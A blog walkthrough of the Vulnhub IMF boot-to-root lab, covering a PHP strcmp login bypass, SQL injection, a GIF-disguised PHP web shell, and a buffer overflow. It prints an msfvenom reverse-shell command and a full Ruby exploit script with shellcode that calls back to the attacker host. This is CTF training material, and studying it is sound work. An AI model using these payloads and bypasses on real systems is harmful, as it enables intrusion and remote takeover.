+++
menu = "posts"
Description = "A walkthrough of the IMF VM from Vulnhub"
date = "2016-11-01T19:16:02-04:00"
title = "B2R: IMF Walkthrough"
Categories = [ "Boot2Root" ]
+++

After mapping the network and finding our IP address at `192.168.1.162`, we can add it to our `/etc/hosts`
temporarily to make things a little easier for us.

~~~bash.prettyprint
echo "192.168.1.162     imf" >> /etc/hosts
~~~

Lets see what kind of machine we're dealing with. 

![](https://i.imgur.com/1DmhXnq.png)


Ok, so web only. Great. `nikto` didn't reveal any low-hanging fruit so let's dive into the source.

![](https://i.imgur.com/S4hPuB2.png)

Check that out! Our first flag was hidden in `http://imf/contact.php`. This looks like base64. After decoding
we get the clue `allthefiles`. Lets keep looking.

Going back to the source code, I found a javascript file that also looked like it was base64 but it didn't
return any results. After a while of going in circles I took my dog for a walk and pondered about what
'allthefiles' could mean. When I came back and looked over the source code again, I saw this:

![](https://i.imgur.com/ANZ1UgC.png)

All the files, ey? 

![](https://i.imgur.com/Ik1rUga.png)

If we visit that directory on our webapp

![](https://i.imgur.com/75xqVVJ.png)

Ok, no DB here. We're dealing with a hardcoded password which means we're dealing with an equaltiy operator
on the backend or possibly the `strcmp()` function. I messed around with nullbyte string termination exploits
here for a while but ultimately ended up nowhere. Let's assume we're dealing with `strcmp` since it's easier
to fool a function than to fool an operator. 

![](https://i.imgur.com/qo8t92C.png)

I'm not very good with PHP, but I'm guessing that I need this function to return a `0` so I fired up
[repl.it](https://repl.it) and started trying to break it. Turns out if you feed it the wrong type (it
expects two strings), it seems to return a `0`.

![](https://i.imgur.com/iQiFPrC.png)
 
So if we can feed this function an array from the web form, we might be able to bypass the password check. By
changing the name of the form's password field from `pass` to `pass[]`, we can do just that. 

![](https://i.imgur.com/DpxX4o7.png)

With the modified form, a BS password, and a username from the Contacts page, we get...

![](https://i.imgur.com/wB0UUP3.png)

The decoded flag just has us click through to the CMS

~~~bash.prettyprint
root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms
~~~

The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
use LFI exploits here, modifying URLs, headers, HTTP methods... nothing. I was trying to enter an empty
`pagename` for like the 100th time when I fat fingered the "enter" key and hit `' + Enter` at the same time
when I saw this:

![](https://i.imgur.com/Oqo4ZQg.png)

SQL! Alright, fired up `sqlmap`

![](https://i.imgur.com/izezAtP.png)
![](https://i.imgur.com/uckNUTe.png)

Looks like we have an image at `imfadministrator/images/whiteboard.jpg`

![](https://i.imgur.com/BBLfAQY.png)

The QR Code is our next flag `flag4{dXBsb2FkcjkOMi5waHA=}`

~~~bash.prettyprint
root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
uploadr942.php   
~~~

We navigate to `http://imf/imfadministrator/uploadr942.php` and we get our uploader. After messing around
with it a bit we can see that the response html from a successful upload has a hash of some sort. I'm
guessing its the hashed version of the filename in the `/uploads` folder. 

Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
db so it gets executed.

![](https://i.imgur.com/y8obNV4.png)

Let's upload it!

![](https://i.imgur.com/ePzjKU9.png)

Haha! Whoops. Alright what about just regular command execution:


~~~bash.prettyprint
cat <<EOF > muahaha.gif
GIF89a
<?php \`id\` ?>
~~~

Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
parameter. Let's replace `id` with `$cmd=$_GET['cmd']; echo $cmd` and try again.

![](https://i.imgur.com/v0uaGPw.png)

Lets get a shell that's easier to work with with `msfvenom`.

![](https://i.imgur.com/lXrjIik.png)
![](https://i.imgur.com/dRelPbw.png)


It's time to get a sense of the machine we're in. "Presence"

  * interesting processes - knockd, sshd
  * interesting files (world readable, executable root files, etc) - `/usr/local/bin`
    * `cat /usr/local/bin/access_codes #> SYN 7482,8279,9467`
    * `/usr/local/bin/agent` - connect to some sort of agent portal; download it
  * listening ports `netstat -plnt` - 7788

It looks like we've got a hidden service running on 7788. To enable it, we have to 'knock' in the right order
so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.

![](https://i.imgur.com/SgDQYRk.png)
![](https://i.imgur.com/SdM3380.png)

Lets decompile our downloaded binary at https://retdec.com/decompilation-run/

![](https://i.imgur.com/WnuLN8R.png)

We can see on line 49 where the authentication happens. It's comparing against a string that was defined on
line 37, `0x2ddd984`. If we pop this into an online hex converter, we get `48093572`

![](https://i.imgur.com/rs6S3Yf.png)

After navigating through our binary, we have a place where we have user input. This is looking like it's
going to be a buffer overflow exploit. Once we download our application and run it through `gdb`, we confirm
that the report function is vulnerable. 

![](https://i.imgur.com/4CxBLoX.png)
![](https://i.imgur.com/bD9RCyw.png)

Bingo. Plug 0x41366641 into `pattern_offset` we see that our buffer ends at 168, meaning our EIP register is
at 169. If we inspect the assembly for the `report` function, we see that our report string is stored in EAX.
Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
other. We can place our exploit at the beginning of EAX by simply injecting it as the "report". We'll then
pad the input string until it's 168 characters long. Then, well tell EIP that it should return to the
beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
address in EIP. 

![](https://i.imgur.com/R7BFi8b.png)
![](https://i.imgur.com/3yWsjBr.png)

Lets generate our shellcode and start to write the exploit.

~~~bash.prettyprint
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b "\x00\x0a\x0d"
~~~

~~~bash.prettyprint
require 'socket'

host = '192.168.1.162'

if ARGV[0] == 'knock'
  [7482, 8279, 9467].each do |port|
    puts "knocking on #{port}"
    `nmap -Pn --host_timeout 201 --max-retries 0 -p #{port} #{host} &>/dev/null`
  end
end

buf = 
"\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xc8\x28\xf5\xc3\x29\xc9" +
"\xb1\x12\x31\x58\x1a\x83\xc0\x04\x03\x58\x16\xe2\x3d\x19" +
"\x2e\x34\x5e\x09\x93\xe8\xca\xac\xa3\x69\x83\x50\x0e\xf5" +
"\x04\xc9\xf9\x36\x82\xef\x58\xde\xd0\xef\x8b\x43\x5d\x0e" +
"\xc1\x1d\x05\x81\x47\xb5\x3c\xc0\x2b\xf4\xbe\xb1\xab\xbf" +
"\xbe\xa5\xb3\xbf\x37\x26\x72\x54\x4b\x68\x96\xa7\xe3\x17" +
"\x94\x38\x58\x61\xc7\xa0\xe8\x7d\xb8\xd0\xd9\xfe\x47\x37"

eip = "\x63\x85\x04\x08"

exploit = buf + "A"*70 + eip

s = TCPSocket.new(host, 7788)
puts s.readpartial(512)
s.write("48093572\n")

puts s.readpartial(512)
s.write("3\n")

puts s.readpartial(512)
s.write(exploit + "\n")
~~~

Let's run it!

![](https://i.imgur.com/ImmvfQj.png)

And there we have it! Thanks for reading!


